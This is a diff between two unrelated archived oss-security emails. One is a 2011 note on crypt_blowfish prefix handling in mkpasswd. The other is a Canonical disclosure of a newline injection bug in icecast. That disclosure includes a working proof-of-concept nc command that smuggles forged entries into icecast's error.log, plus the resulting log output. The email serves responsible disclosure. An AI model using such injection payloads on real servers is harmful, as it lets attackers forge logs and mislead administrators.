@@ -1,28 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/07/07/2
-Message-Id: <201107071005.07672.ludwig.nussel@suse.de>
-Date: Thu, 7 Jul 2011 10:05:07 +0200
-From: Ludwig Nussel <ludwig.nussel@...e.de>
-To: oss-security@...ts.openwall.com
-Cc: Solar Designer <solar@...nwall.com>, Michael Matz <matz@...e.de>, Thorsten Kukuk <kukuk@...e.de>, Andreas Jaeger <aj@...e.de>
-Subject: Re: CVE request: crypt_blowfish 8-bit character mishandling
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/12/15/4
+Message-ID: <1323973540.3281.77.camel@localhost>
+Date: Thu, 15 Dec 2011 12:25:40 -0600
+From: Jamie Strandboge <jamie@...onical.com>
+To: icecast-dev@...h.org
+Cc: oss-security@...ts.openwall.com, security@...ntu.com,  security@...itz-naumann.com
+Subject: Security issue in icecast
 Content-Type: text/plain; charset=utf-8
 
-Solar Designer wrote:
-> Here's my current code, with lots of comments - more comments than code,
-> actually, because the code is very compact:
+A security bug was reported by Moritz Naumann against icecast in
+Ubuntu. You are being emailed as the upstream contact. Please keep
+oss-security@...ts.openwall.com[1] CC'd for any updates on this issue.
 
-mkpasswd (package whois) checks whether the crypted password starts
-with the originally requested prefix. Since crypt_gensalt now
-returns $2y for $2a mkpasswd fails. I'm not claiming mkpasswd's
-assumption on the behavior of crypt_gensalt is correct but it's not
-documented whether crypt_gensalt may change the prefix.
+This issue should be considered public and has not yet been assigned a
+CVE.
 
-cu
-Ludwig
+Details from the public bug follow:
+https://launchpad.net/bugs/894782
+
+From the reporter:
+"Newline injection in error.log
+
+Running this command against an icecast2 running on 127.0.0.1...
+
+echo -ne "GET /non-existent"'"'"%20No%20such%20file%20or%20directory%0d%
+0a[1970-01-01%20%2000:00:00]%20PHUN%20I'm%20feeling%20phunny%0d%
+0a["`date "+%Y-%m-%d%%20%%20%H:%M:%S"`"]%20WARN%
+20fserve/fserve_client_create%20req%20for%20file%
+20"'"'"/usr/share/icecast2/web/ HTTP/1.0\n\n" | nc -vv 127.0.0.1 8000
+> /dev/null
+
+...causes the following to be written to /var/log/icecast2/error.log:
+[2011-11-25 15:37:31] INFO fserve/fserve_client_create checking for
+file /non-existent" No such file or directory
+[1970-01-01 00:00:00] PHUN I'm feeling phunny
+..."
+
+Thanks in advance for your cooperation in coordinating a fix for this
+issue.
+
+[1] oss-security@...ts.openwall.com is a public mailing list for
+    people to collaborate on security vulnerabilities and coordinate
+    security updates.
 
 -- 
- (o_   Ludwig Nussel
- //\
- V_/_  http://www.suse.de/
-SUSE LINUX Products GmbH, GF: Jeff Hawn, Jennifer Guild, Felix Imendörffer, HRB 16746 (AG Nürnberg) 
+Jamie Strandboge             | http://www.canonical.com
+
+Download attachment "signature.asc" of type "application/pgp-signature" (837 bytes)
